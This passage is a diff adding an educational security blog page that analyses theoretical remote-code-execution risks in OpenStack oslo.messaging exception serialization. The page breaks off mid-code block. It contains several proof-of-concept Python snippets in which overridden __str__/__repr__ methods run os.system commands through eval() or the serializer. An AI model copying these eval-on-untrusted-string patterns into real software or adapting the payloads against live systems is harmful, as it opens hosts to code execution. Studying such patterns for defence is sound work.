@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned | Code Before Breach</title>
+<meta name="keywords" content="OpenStack, Nova, RCE, Vulnerability Analysis, oslo.messaging, Exception Serialization">
+<meta name="description" content="Analysis of potential Remote Code Execution vulnerability in OpenStack Nova&rsquo;s exception serialization mechanism, including multiple PoC scenarios and defense recommendations.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">
+<link href="https://fonts.googleapis.com/css2?family=Spectral:wght@400;700&display=swap" rel="stylesheet">
+<link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:1313/index.xml" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+<script defer src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/en/" accesskey="h" title="Code Before Breach (Alt + H)">
+                <img src="http://localhost:1313/images/logo-terminal-animated.svg" alt="" aria-label="logo" class="h-7 w-auto"
+                    height="28">Code Before Breach</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="http://localhost:1313/ko/" title="한국어"
+                            aria-label="한국어">Ko</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/en/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/en/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/en/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/en/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/en/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/en/index.xml" title="RSS">
+                    <span>RSS</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+
+
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/en/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/en/post/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned
+    </h1>
+    <div class="post-meta"><span title='2025-06-10 00:00:00 +0000 UTC'>June 10, 2025</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1615 words
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#key-findings" aria-label="Key Findings">Key Findings</a><ul>
+                        
+                <li>
+                    <a href="#-poc-1-" aria-label="✅ PoC 1 – __str__ Override with eval(str(e)) (Theoretical Example)">✅ PoC 1 – __str__ Override with eval(str(e)) (Theoretical Example)</a></li>
+                <li>
+                    <a href="#-poc-2-" aria-label="✅ PoC 2 – __str__ Returns JSON Payload &#43; eval (Theoretical Example)">✅ PoC 2 – __str__ Returns JSON Payload + eval (Theoretical Example)</a></li>
+                <li>
+                    <a href="#-poc-3-" aria-label="✅ PoC 3 – eval(repr(e)) (Theoretical Example)">✅ PoC 3 – eval(repr(e)) (Theoretical Example)</a></li>
+                <li>
+                    <a href="#-poc-4--trigger-via" aria-label="✅ PoC 4 – Trigger via serialize_remote_exception() (Theoretical Example)">✅ PoC 4 – Trigger via serialize_remote_exception() (Theoretical Example)</a></li>
+                <li>
+                    <a href="#-poc-5--race-condition-with-threads-theoretical-example" aria-label="✅ PoC 5 – Race Condition with Threads (Theoretical Example)">✅ PoC 5 – Race Condition with Threads (Theoretical Example)</a><ul>
+                        
+                <li>
+                    <a href="#limitations-of-this-poc" aria-label="Limitations of This PoC">Limitations of This PoC</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#openstack-specific-vulnerability-context" aria-label="OpenStack-specific Vulnerability Context">OpenStack-specific Vulnerability Context</a><ul>
+                        
+                <li>
+                    <a href="#serialize_remote_exception" aria-label="serialize_remote_exception()">serialize_remote_exception()</a></li>
+                <li>
+                    <a href="#deserialize_remote_exception" aria-label="deserialize_remote_exception()">deserialize_remote_exception()</a></li>
+                <li>
+                    <a href="#openstack-products-and-custom-exception-namespaces" aria-label="OpenStack Products and Custom Exception Namespaces">OpenStack Products and Custom Exception Namespaces</a></li></ul>
+                </li>
+                <li>
+                    <a href="#challenges-to-exploitation" aria-label="Challenges to Exploitation">Challenges to Exploitation</a></li>
+                <li>
+                    <a href="#recommendations" aria-label="Recommendations">Recommendations</a></li>
+                <li>
+                    <a href="#related-references-and-resources" aria-label="Related References and Resources">Related References and Resources</a></li>
+                <li>
+                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>Author</strong>: Hyeongkwan Lee<br>
+<strong>Email</strong>: <a href="mailto:windshock@gmail.com">windshock@gmail.com</a><br>
+<strong>GitHub</strong>: <a href="https://github.com/windshock">https://github.com/windshock</a><br>
+<strong>LinkedIn</strong>: <a href="https://www.linkedin.com/in/windshock/">https://www.linkedin.com/in/windshock/</a><br>
+<strong>Blog</strong>: <a href="https://windshock.github.io/">https://windshock.github.io</a></p>
+<hr>
+<p><strong>XML-RPC Security Series:</strong></p>
+<ul>
+<li><a href="https://windshock.github.io/en/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/">Series 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies</a></li>
+<li><a href="https://windshock.github.io/en/post/2025-04-24-cve-2019-17570-apache-xmlrpc/">Series 2 - CVE-2019-17570: Apache XML-RPC Exploit</a></li>
+<li><a href="https://windshock.github.io/en/post/2025-05-30-rce-via-exception-serialization-in-openstack-nova/">Series 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned</a></li>
+</ul>
+<hr>
+<h2 id="overview"><strong>Overview</strong><a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>This report analyzes theoretical Remote Code Execution (RCE) risks related to exception serialization and deserialization in OpenStack Nova&rsquo;s use of the <code>oslo.messaging</code> library. The goal is not to claim that practical RCE is easily achievable, but to help security engineers and developers recognize anti-patterns and learn from them. Multiple real-world safeguards (such as module whitelisting, message broker isolation, and secure logging practices) make actual exploitation highly unlikely in production OpenStack environments. The following PoC scenarios are intended for educational purposes, to illustrate how insecure exception handling patterns could become risky if other defenses are misconfigured or absent.</p>
+<hr>
+<h2 id="key-findings"><strong>Key Findings</strong><a hidden class="anchor" aria-hidden="true" href="#key-findings">#</a></h2>
+<blockquote>
+<p><strong>Note:</strong> These PoCs are for educational demonstration of risky exception handling patterns. In real OpenStack deployments, multiple safeguards make actual exploitation highly unlikely.</p></blockquote>
+<h3 id="-poc-1-"><strong>✅ PoC 1 – <code>__str__</code> Override with <code>eval(str(e))</code> (Theoretical Example)</strong><a hidden class="anchor" aria-hidden="true" href="#-poc-1-">#</a></h3>
+<p>This proof-of-concept demonstrates, in a controlled example, that when an exception class overrides its <code>__str__()</code> method to return a malicious string, any call to <code>eval(str(e))</code> could theoretically result in Remote Code Execution. In practice, such a pattern should never appear in production code, and OpenStack&rsquo;s architecture includes multiple layers of defense.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Evil</span>(<span style="color:#a6e22e">Exception</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __str__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;touch /tmp/from_str_eval&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eval(str(Evil()))  <span style="color:#75715e"># Triggers RCE</span>
+</span></span></code></pre></div><h3 id="-poc-2-"><strong>✅ PoC 2 – <code>__str__</code> Returns JSON Payload + <code>eval</code> (Theoretical Example)</strong><a hidden class="anchor" aria-hidden="true" href="#-poc-2-">#</a></h3>
+<p>This variant shows, for educational purposes, how a <code>__str__()</code> method returning a JSON-encoded payload could, if mishandled, lead to code execution if the parsed content is used in an <code>eval()</code> call. Again, this is not a pattern seen in well-designed production systems, but highlights why input validation and secure exception handling are important.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Evil</span>(<span style="color:#a6e22e">Exception</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __str__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;{&#34;payload&#34;: &#34;__import__(</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">os</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">).system(</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">touch /tmp/json_rce</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">)&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(str(Evil()))
+</span></span><span style="display:flex;"><span>eval(data[<span style="color:#e6db74">&#34;payload&#34;</span>])  <span style="color:#75715e"># Triggers RCE</span>
+</span></span></code></pre></div><h3 id="-poc-3-"><strong>✅ PoC 3 – <code>eval(repr(e))</code> (Theoretical Example)</strong><a hidden class="anchor" aria-hidden="true" href="#-poc-3-">#</a></h3>
+<p>This PoC demonstrates, as a theoretical risk, that <code>repr()</code> can also be overridden to return arbitrary content. If any part of the system executes <code>eval(repr(obj))</code> without ensuring that <code>obj</code> is a safe type, code execution could occur. This underscores that both <code>__str__</code> and <code>__repr__</code> must be considered attack surfaces in code reviews.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Evil</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __repr__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;touch /tmp/hacked&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eval(repr(Evil()))  <span style="color:#75715e"># RCE</span>
+</span></span></code></pre></div><h3 id="-poc-4--trigger-via"><strong>✅ PoC 4 – Trigger via <code>serialize_remote_exception()</code> (Theoretical Example)</strong><a hidden class="anchor" aria-hidden="true" href="#-poc-4--trigger-via">#</a></h3>
+<p>Here, the PoC illustrates that if OpenStack&rsquo;s <code>serialize_remote_exception()</code> function were to call <code>str(e)</code> on a malicious exception object, code execution could theoretically occur. In practice, OpenStack&rsquo;s design and deployment mitigations make this scenario extremely unlikely.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> oslo_messaging._drivers <span style="color:#f92672">import</span> common <span style="color:#66d9ef">as</span> exceptions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EvilError</span>(<span style="color:#a6e22e">Exception</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __str__(self):
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;touch /tmp/hacked&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;rce via serialize&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> EvilError(<span style="color:#e6db74">&#34;boom&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>    exc_info <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>exc_info()
+</span></span><span style="display:flex;"><span>    serialized <span style="color:#f92672">=</span> exceptions<span style="color:#f92672">.</span>serialize_remote_exception(exc_info)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;File created:&#34;</span>, os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(<span style="color:#e6db74">&#34;/tmp/hacked&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">→</span> Malicious __str__() <span style="color:#f92672">is</span> executed within the serializer<span style="color:#f92672">.</span>
+</span></span></code></pre></div><h3 id="-poc-5--race-condition-with-threads-theoretical-example"><strong>✅ PoC 5 – Race Condition with Threads (Theoretical Example)</strong><a hidden class="anchor" aria-hidden="true" href="#-poc-5--race-condition-with-threads-theoretical-example">#</a></h3>
+<p>This experiment simulates a theoretical race condition scenario in which multiple threads concurrently deserialize and serialize exception objects. The test proves that when two threads (a producer and a consumer) access shared exceptions via a queue, the serializer thread may trigger <code>str(ex)</code> on a malicious object before it has been fully sanitized. As discussed below, this is not a realistic risk in actual OpenStack deployments.</p>
+<blockquote>
+<p><strong>Note:</strong> In actual OpenStack oslo.messaging and Nova implementations, global variables or direct sharing of exception objects across threads or processes does not occur. Exception objects are always serialized and deserialized across process or network boundaries, meaning each thread or process works with its own instance. Therefore, the race condition demonstrated in this PoC does not represent a realistic risk in real-world OpenStack environments. This PoC should be considered a theoretical demonstration of Python concurrency issues, not a practical exploit vector for OpenStack.</p></blockquote>
+<p>This demonstrates the danger of using shared resources and exception objects across asynchronous or threaded boundaries without protective synchronization or trust boundaries. Even in environments with the GIL, race windows can expose critical bugs.</p>
+<h4 id="limitations-of-this-poc"><strong>Limitations of This PoC</strong><a hidden class="anchor" aria-hidden="true" href="#limitations-of-this-poc">#</a></h4>
+<ul>
+<li>
+<p>This PoC assumes shared mutable global state (<code>hit_count</code>), which is not typically used in production code.</p>
+</li>
+<li>
+<p>Python&rsquo;s Global Interpreter Lock (GIL) limits true concurrency, so race conditions in CPython are often timing-dependent and may be less predictable.</p>
+</li>
+<li>
+<p>The <code>Boom</code> object is explicitly crafted and passed across a shared queue without serialization boundaries; in real deployments, such objects would typically be serialized/deserialized across process or network boundaries, limiting direct reference reuse.</p>
+</li>
+<li>
+<p>Nevertheless, this PoC illustrates the class of timing-sensitive bugs that arise from deserialization and stringification of attacker-influenced objects in multi-threaded environments.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> queue <span style="color:#f92672">import</span> Queue
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> queue  <span style="color:#75715e"># for queue.Full exception</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Shared resources</span>
+</span></span><span style="display:flex;"><span>hit_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>ex_queue <span style="color:#f92672">=</span> Queue(maxsize<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Boom</span>(<span style="color:#a6e22e">Exception</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __str__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> hit_count
+</span></span><span style="display:flex;"><span>        local_count <span style="color:#f92672">=</span> hit_count
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Thread </span><span style="color:#e6db74">{</span>threading<span style="color:#f92672">.</span>current_thread()<span style="color:#f92672">.</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74"> reading hit_count=</span><span style="color:#e6db74">{</span>local_count<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">0.001</span>, <span style="color:#ae81ff">0.003</span>))  <span style="color:#75715e"># 1ms ~ 3ms delay</span>
+</span></span><span style="display:flex;"><span>        hit_count <span style="color:#f92672">=</span> local_count <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Thread </span><span style="color:#e6db74">{</span>threading<span style="color:#f92672">.</span>current_thread()<span style="color:#f92672">.</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74"> set hit_count=</span><span style="color:#e6db74">{</span>hit_count<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;touch /tmp/hacked_race_</span><span style="color:#e6db74">{</span>hit_count<span style="color:#e6db74">}</span><span style="color:#e6db74">_thread_</span><span style="color:#e6db74">{</span>threading<span style="color:#f92672">.</span>current_thread()<span style="color:#f92672">.</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;boom_</span><span style="color:#e6db74">{</span>hit_count<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">deserializer</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> hit_count
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> hit_count <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>:
+</span></span><span style="display:flex;"><span>        ex <span style="color:#f92672">=</span> Boom()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Thread </span><span style="color:#e6db74">{</span>threading<span style="color:#f92672">.</span>current_thread()<span style="color:#f92672">.</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74"> created Boom&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            ex_queue<span style="color:#f92672">.</span>put(ex, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">0.001</span>, <span style="color:#ae81ff">0.003</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> queue<span style="color:#f92672">.</span>Full:
+</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">0.001</span>, <span style="color:#ae81ff">0.003</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">serializer</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> hit_count
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> hit_count <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            ex <span style="color:#f92672">=</span> ex_queue<span style="color:#f92672">.</span>get(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.3</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Thread </span><span style="color:#e6db74">{</span>threading<span style="color:#f92672">.</span>current_thread()<span style="color:#f92672">.</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74"> got Boom, calling str&#34;</span>)
+</span></span><span style="display:flex;"><span>            str(ex)  <span style="color:#75715e"># Triggers Boom.__str__</span>
+</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">0.001</span>, <span style="color:#ae81ff">0.003</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> Queue<span style="color:#f92672">.</span>Empty:
+</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(random<span style="color:#f92672">.</span>uniform(<span style="color:#ae81ff">0.001</span>, <span style="color:#ae81ff">0.003</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Minimal thread setup</span>
+</span></span><span style="display:flex;"><span>threads <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>deserializer, name<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Deserializer-</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>] <span style="color:#f92672">+</span> [
+</span></span><span style="display:flex;"><span>    threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>serializer, name<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Serializer-</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> threads:
+</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> threads:
+</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>join(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Final hit_count:&#34;</span>, hit_count)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Generated files:&#34;</span>, sorted([f <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;/tmp&#34;</span>) <span style="color:#66d9ef">if</span> f<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;hacked_race_&#34;</span>)]))
+</span></span></code></pre></div><hr>
+<h2 id="openstack-specific-vulnerability-context"><strong>OpenStack-specific Vulnerability Context</strong><a hidden class="anchor" aria-hidden="true" href="#openstack-specific-vulnerability-context">#</a></h2>
+<p>The vulnerable functions <code>serialize_remote_exception()</code> and <code>deserialize_remote_exception()</code> are part of the <code>oslo.messaging</code> library, not Nova itself. Nova uses them as part of its RPC communication and error-handling infrastructure. These functions are located in <code>oslo_messaging/_drivers/common.py</code> and are called by various RPC transport mechanisms. Because oslo.messaging is a shared library across OpenStack services, this vulnerability has implications beyond Nova if other components reuse the same serialization logic.</p>
+<h3 id="serialize_remote_exception"><strong>serialize_remote_exception()</strong><a hidden class="anchor" aria-hidden="true" href="#serialize_remote_exception">#</a></h3>
+<p>This function serializes Python exceptions into a dictionary format for RPC transport. One critical line calls <code>str(failure)</code>, which is the same as <code>str(ex)</code>. If the exception object has an overridden <code>__str__()</code> method with side effects, this call can trigger arbitrary code execution. This makes the serialization process itself a potential RCE entry point, especially if exceptions are passed from untrusted sources or deserialized objects.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#39;class&#39;</span>: cls_name,
+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#39;module&#39;</span>: mod_name,
+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#39;message&#39;</span>: str(failure),
